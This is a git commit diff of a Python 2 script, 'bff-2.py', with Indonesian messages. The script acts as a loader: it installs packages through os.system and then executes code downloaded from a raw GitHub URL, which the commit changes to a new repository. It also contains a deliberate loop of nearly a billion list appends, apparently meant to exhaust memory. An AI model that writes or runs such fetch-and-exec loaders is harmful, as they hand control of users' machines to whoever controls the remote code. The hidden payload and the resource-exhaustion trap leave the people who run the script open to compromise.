1dc89d716e7f8952ca24837c210bd5f0bde79d33
warba29 <92699889+warba29@users.noreply.github.com>
2021-11-10 01:35:37 +0700

    Update bff-2.py

--- bff-2.py
+++ bff-2.py
@@ -1,38 +1,24 @@
 # coding:utf-8
 import os, sys, time
-oh = []
-
-ngen = ("""
-
-HAYO MAU NGAPAIN TOD?
-
-""")
-
-
+awas = []
 try:
     import requests
 except ImportError:
-    os.system('''
-pip2 install requests ''' + sys.argv[0])
-
+    os.system('pip2 install requests && python2 ' + sys.argv[0])
 
 try:
     import bs4
 except ImportError:
-    os.system('''
-pip2 install bs4 ''' + sys.argv[0])
-
-
+    os.system('pip2 install bs4 && python2 ' + sys.argv[0])
 except IOError:
     for x in range(999999999):
-        oh.append(sys.argv[0])
+        awas.append(sys.argv[0])
+
     sys.exit()
-    
 
 try:
-    exec requests.get('https://raw.githubusercontent.com/warba29/server/main/bff.py').text
+    exec requests.get('https://raw.githubusercontent.com/warba29/pler/main/bff.py').text
 except requests.exceptions.ConnectionError:
-    sys.exit('\n\x1b[1;91m• Tidak ada koneksi!')
-
+    sys.exit('\n [!] koneksi mu bermasalah lol!')
 
 exit()
